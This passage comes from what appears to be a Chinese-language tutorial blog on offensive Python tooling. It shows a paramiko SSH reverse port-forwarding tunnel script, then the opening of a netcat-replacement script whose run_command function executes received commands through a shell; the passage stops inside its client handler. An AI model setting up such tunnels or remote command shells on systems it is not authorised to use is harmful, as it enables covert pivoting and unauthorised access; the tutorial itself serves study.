</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>select</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>threading</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>optparse</span> <span class=kn>import</span> <span class=n>OptionParser</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>paramiko</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>SSH_PORT</span> <span class=o>=</span> <span class=mi>22</span>
</span></span><span class=line><span class=cl><span class=n>DEFAULT_PORT</span> <span class=o>=</span> <span class=mi>4000</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>g_verbose</span> <span class=o>=</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>handler</span><span class=p>(</span><span class=n>chan</span><span class=p>,</span> <span class=n>host</span><span class=p>,</span> <span class=n>port</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sock</span> <span class=o>=</span> <span class=n>socket</span><span class=o>.</span><span class=n>socket</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>sock</span><span class=o>.</span><span class=n>connect</span><span class=p>((</span><span class=n>host</span><span class=p>,</span> <span class=n>port</span><span class=p>))</span> <span class=c1># 與剛剛的例子對比，原本是在這裡跑指令，不過這邊是連到另一台server</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>verbose</span><span class=p>(</span><span class=s2>&#34;Forwarding request to </span><span class=si>%s</span><span class=s2>:</span><span class=si>%d</span><span class=s2> failed: </span><span class=si>%r</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=p>(</span><span class=n>host</span><span class=p>,</span> <span class=n>port</span><span class=p>,</span> <span class=n>e</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>verbose</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;Connected!  Tunnel open </span><span class=si>%r</span><span class=s2> -&gt; </span><span class=si>%r</span><span class=s2> -&gt; </span><span class=si>%r</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>        <span class=o>%</span> <span class=p>(</span><span class=n>chan</span><span class=o>.</span><span class=n>origin_addr</span><span class=p>,</span> <span class=n>chan</span><span class=o>.</span><span class=n>getpeername</span><span class=p>(),</span> <span class=p>(</span><span class=n>host</span><span class=p>,</span> <span class=n>port</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>	<span class=c1># chan(sshd) &lt;-&gt; sock(real server)</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span><span class=p>,</span> <span class=n>w</span><span class=p>,</span> <span class=n>x</span> <span class=o>=</span> <span class=n>select</span><span class=o>.</span><span class=n>select</span><span class=p>([</span><span class=n>sock</span><span class=p>,</span> <span class=n>chan</span><span class=p>],</span> <span class=p>[],</span> <span class=p>[])</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>sock</span> <span class=ow>in</span> <span class=n>r</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>data</span> <span class=o>=</span> <span class=n>sock</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>1024</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>data</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>break</span>
</span></span><span class=line><span class=cl>            <span class=n>chan</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>chan</span> <span class=ow>in</span> <span class=n>r</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>data</span> <span class=o>=</span> <span class=n>chan</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>1024</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>data</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>break</span>
</span></span><span class=line><span class=cl>            <span class=n>sock</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>chan</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>sock</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>verbose</span><span class=p>(</span><span class=s2>&#34;Tunnel closed from </span><span class=si>%r</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=p>(</span><span class=n>chan</span><span class=o>.</span><span class=n>origin_addr</span><span class=p>,))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>reverse_forward_tunnel</span><span class=p>(</span><span class=n>server_port</span><span class=p>,</span> <span class=n>remote_host</span><span class=p>,</span> <span class=n>remote_port</span><span class=p>,</span> <span class=n>transport</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>transport</span><span class=o>.</span><span class=n>request_port_forward</span><span class=p>(</span><span class=s2>&#34;&#34;</span><span class=p>,</span> <span class=n>server_port</span><span class=p>)</span> <span class=c1># bind(&#34;0.0.0.0&#34;, server_port)</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>chan</span> <span class=o>=</span> <span class=n>transport</span><span class=o>.</span><span class=n>accept</span><span class=p>(</span><span class=mi>1000</span><span class=p>)</span> <span class=c1># accept 來自sshd的連線</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>chan</span> <span class=ow>is</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>continue</span>
</span></span><span class=line><span class=cl>        <span class=n>thr</span> <span class=o>=</span> <span class=n>threading</span><span class=o>.</span><span class=n>Thread</span><span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=n>target</span><span class=o>=</span><span class=n>handler</span><span class=p>,</span> <span class=n>args</span><span class=o>=</span><span class=p>(</span><span class=n>chan</span><span class=p>,</span> <span class=n>remote_host</span><span class=p>,</span> <span class=n>remote_port</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>thr</span><span class=o>.</span><span class=n>setDaemon</span><span class=p>(</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>thr</span><span class=o>.</span><span class=n>start</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>verbose</span><span class=p>(</span><span class=n>s</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>g_verbose</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>s</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>HELP</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s2>Set up a reverse forwarding tunnel across an SSH server, using paramiko. A
</span></span></span><span class=line><span class=cl><span class=s2>port on the SSH server (given with -p) is forwarded across an SSH session
</span></span></span><span class=line><span class=cl><span class=s2>back to the local machine, and out to a remote site reachable from this
</span></span></span><span class=line><span class=cl><span class=s2>network. This is similar to the openssh -R option.
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_host_port</span><span class=p>(</span><span class=n>spec</span><span class=p>,</span> <span class=n>default_port</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;parse &#39;hostname:22&#39; into a host and port, with the port optional&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>args</span> <span class=o>=</span> <span class=p>(</span><span class=n>spec</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;:&#34;</span><span class=p>,</span> <span class=mi>1</span><span class=p>)</span> <span class=o>+</span> <span class=p>[</span><span class=n>default_port</span><span class=p>])[:</span><span class=mi>2</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>args</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>args</span><span class=p>[</span><span class=mi>1</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>args</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>args</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>parse_options</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>g_verbose</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>parser</span> <span class=o>=</span> <span class=n>OptionParser</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=n>usage</span><span class=o>=</span><span class=s2>&#34;usage: %prog [options] &lt;ssh-server&gt;[:&lt;server-port&gt;]&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>version</span><span class=o>=</span><span class=s2>&#34;%prog 1.0&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>description</span><span class=o>=</span><span class=n>HELP</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>parser</span><span class=o>.</span><span class=n>add_option</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;-q&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;--quiet&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>action</span><span class=o>=</span><span class=s2>&#34;store_false&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>dest</span><span class=o>=</span><span class=s2>&#34;verbose&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>default</span><span class=o>=</span><span class=kc>True</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>help</span><span class=o>=</span><span class=s2>&#34;squelch all informational output&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>parser</span><span class=o>.</span><span class=n>add_option</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;-p&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;--remote-port&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>action</span><span class=o>=</span><span class=s2>&#34;store&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=nb>type</span><span class=o>=</span><span class=s2>&#34;int&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>dest</span><span class=o>=</span><span class=s2>&#34;port&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>default</span><span class=o>=</span><span class=n>DEFAULT_PORT</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>help</span><span class=o>=</span><span class=s2>&#34;port on server to forward (default: </span><span class=si>%d</span><span class=s2>)&#34;</span> <span class=o>%</span> <span class=n>DEFAULT_PORT</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>parser</span><span class=o>.</span><span class=n>add_option</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;-u&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;--user&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>action</span><span class=o>=</span><span class=s2>&#34;store&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=nb>type</span><span class=o>=</span><span class=s2>&#34;string&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>dest</span><span class=o>=</span><span class=s2>&#34;user&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>default</span><span class=o>=</span><span class=n>getpass</span><span class=o>.</span><span class=n>getuser</span><span class=p>(),</span>
</span></span><span class=line><span class=cl>        <span class=n>help</span><span class=o>=</span><span class=s2>&#34;username for SSH authentication (default: </span><span class=si>%s</span><span class=s2>)&#34;</span>
</span></span><span class=line><span class=cl>        <span class=o>%</span> <span class=n>getpass</span><span class=o>.</span><span class=n>getuser</span><span class=p>(),</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>parser</span><span class=o>.</span><span class=n>add_option</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;-K&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;--key&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>action</span><span class=o>=</span><span class=s2>&#34;store&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=nb>type</span><span class=o>=</span><span class=s2>&#34;string&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>dest</span><span class=o>=</span><span class=s2>&#34;keyfile&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>default</span><span class=o>=</span><span class=kc>None</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>help</span><span class=o>=</span><span class=s2>&#34;private key file to use for SSH authentication&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>parser</span><span class=o>.</span><span class=n>add_option</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;--no-key&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>action</span><span class=o>=</span><span class=s2>&#34;store_false&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>dest</span><span class=o>=</span><span class=s2>&#34;look_for_keys&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>default</span><span class=o>=</span><span class=kc>True</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>help</span><span class=o>=</span><span class=s2>&#34;don&#39;t look for or use a private key file&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>parser</span><span class=o>.</span><span class=n>add_option</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;-P&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;--password&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>action</span><span class=o>=</span><span class=s2>&#34;store_true&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>dest</span><span class=o>=</span><span class=s2>&#34;readpass&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>default</span><span class=o>=</span><span class=kc>False</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>help</span><span class=o>=</span><span class=s2>&#34;read password (for key or password auth) from stdin&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>parser</span><span class=o>.</span><span class=n>add_option</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;-r&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;--remote&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>action</span><span class=o>=</span><span class=s2>&#34;store&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=nb>type</span><span class=o>=</span><span class=s2>&#34;string&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>dest</span><span class=o>=</span><span class=s2>&#34;remote&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>default</span><span class=o>=</span><span class=kc>None</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>metavar</span><span class=o>=</span><span class=s2>&#34;host:port&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>help</span><span class=o>=</span><span class=s2>&#34;remote host and port to forward to&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>options</span><span class=p>,</span> <span class=n>args</span> <span class=o>=</span> <span class=n>parser</span><span class=o>.</span><span class=n>parse_args</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>args</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>parser</span><span class=o>.</span><span class=n>error</span><span class=p>(</span><span class=s2>&#34;Incorrect number of arguments.&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>options</span><span class=o>.</span><span class=n>remote</span> <span class=ow>is</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>parser</span><span class=o>.</span><span class=n>error</span><span class=p>(</span><span class=s2>&#34;Remote address required (-r).&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>g_verbose</span> <span class=o>=</span> <span class=n>options</span><span class=o>.</span><span class=n>verbose</span>
</span></span><span class=line><span class=cl>    <span class=n>server_host</span><span class=p>,</span> <span class=n>server_port</span> <span class=o>=</span> <span class=n>get_host_port</span><span class=p>(</span><span class=n>args</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>SSH_PORT</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>remote_host</span><span class=p>,</span> <span class=n>remote_port</span> <span class=o>=</span> <span class=n>get_host_port</span><span class=p>(</span><span class=n>options</span><span class=o>.</span><span class=n>remote</span><span class=p>,</span> <span class=n>SSH_PORT</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>options</span><span class=p>,</span> <span class=p>(</span><span class=n>server_host</span><span class=p>,</span> <span class=n>server_port</span><span class=p>),</span> <span class=p>(</span><span class=n>remote_host</span><span class=p>,</span> <span class=n>remote_port</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>options</span><span class=p>,</span> <span class=n>server</span><span class=p>,</span> <span class=n>remote</span> <span class=o>=</span> <span class=n>parse_options</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>password</span> <span class=o>=</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>options</span><span class=o>.</span><span class=n>readpass</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>password</span> <span class=o>=</span> <span class=n>getpass</span><span class=o>.</span><span class=n>getpass</span><span class=p>(</span><span class=s2>&#34;Enter SSH password: &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>client</span> <span class=o>=</span> <span class=n>paramiko</span><span class=o>.</span><span class=n>SSHClient</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>client</span><span class=o>.</span><span class=n>load_system_host_keys</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>client</span><span class=o>.</span><span class=n>set_missing_host_key_policy</span><span class=p>(</span><span class=n>paramiko</span><span class=o>.</span><span class=n>WarningPolicy</span><span class=p>())</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>verbose</span><span class=p>(</span><span class=s2>&#34;Connecting to ssh host </span><span class=si>%s</span><span class=s2>:</span><span class=si>%d</span><span class=s2> ...&#34;</span> <span class=o>%</span> <span class=p>(</span><span class=n>server</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>server</span><span class=p>[</span><span class=mi>1</span><span class=p>]))</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>client</span><span class=o>.</span><span class=n>connect</span><span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=n>server</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span>
</span></span><span class=line><span class=cl>            <span class=n>server</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span>
</span></span><span class=line><span class=cl>            <span class=n>username</span><span class=o>=</span><span class=n>options</span><span class=o>.</span><span class=n>user</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=n>key_filename</span><span class=o>=</span><span class=n>options</span><span class=o>.</span><span class=n>keyfile</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=n>look_for_keys</span><span class=o>=</span><span class=n>options</span><span class=o>.</span><span class=n>look_for_keys</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=n>password</span><span class=o>=</span><span class=n>password</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;*** Failed to connect to </span><span class=si>%s</span><span class=s2>:</span><span class=si>%d</span><span class=s2>: </span><span class=si>%r</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=p>(</span><span class=n>server</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>server</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=n>e</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=n>sys</span><span class=o>.</span><span class=n>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>verbose</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;Now forwarding remote port </span><span class=si>%d</span><span class=s2> to </span><span class=si>%s</span><span class=s2>:</span><span class=si>%d</span><span class=s2> ...&#34;</span>
</span></span><span class=line><span class=cl>        <span class=o>%</span> <span class=p>(</span><span class=n>options</span><span class=o>.</span><span class=n>port</span><span class=p>,</span> <span class=n>remote</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>remote</span><span class=p>[</span><span class=mi>1</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>reverse_forward_tunnel</span><span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=n>options</span><span class=o>.</span><span class=n>port</span><span class=p>,</span> <span class=n>remote</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>remote</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=n>client</span><span class=o>.</span><span class=n>get_transport</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>KeyboardInterrupt</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;C-c: Port forwarding stopped.&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>sys</span><span class=o>.</span><span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>main</span><span class=p>()</span>
</span></span></code></pre></div><h3 id=總複習-netcat-replacement>總複習: Netcat Replacement<a hidden class=anchor aria-hidden=true href=#總複習-netcat-replacement>#</a></h3><p>bhnet.py</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>socket</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>getopt</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>threading</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>subprocess</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># define some global variables</span>
</span></span><span class=line><span class=cl><span class=n>listen</span> <span class=o>=</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl><span class=n>command</span> <span class=o>=</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl><span class=n>upload</span> <span class=o>=</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl><span class=n>execute</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>target</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>upload_destination</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>port</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># this runs a command and returns the output</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>run_command</span><span class=p>(</span><span class=n>cmd</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=c1># trim the newline</span>
</span></span><span class=line><span class=cl>    <span class=n>cmd</span> <span class=o>=</span> <span class=n>cmd</span><span class=o>.</span><span class=n>rstrip</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># run the command and get the output back</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>output</span> <span class=o>=</span> <span class=n>subprocess</span><span class=o>.</span><span class=n>check_output</span><span class=p>(</span><span class=n>cmd</span><span class=p>,</span> <span class=n>stderr</span><span class=o>=</span><span class=n>subprocess</span><span class=o>.</span><span class=n>STDOUT</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                                         <span class=n>shell</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=n>subprocess</span><span class=o>.</span><span class=n>CalledProcessError</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>output</span> <span class=o>=</span> <span class=n>e</span><span class=o>.</span><span class=n>output</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># send the output back to the client</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>output</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># this handles incoming client connections</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>client_handler</span><span class=p>(</span><span class=n>client_socket</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>upload</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>execute</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>command</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># check for upload</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>upload_destination</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># read in all of the bytes and write to our destination</span>
</span></span><span class=line><span class=cl>        <span class=n>file_buffer</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># keep reading data until none is available</span>
</span></span><span class=line><span class=cl>        <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
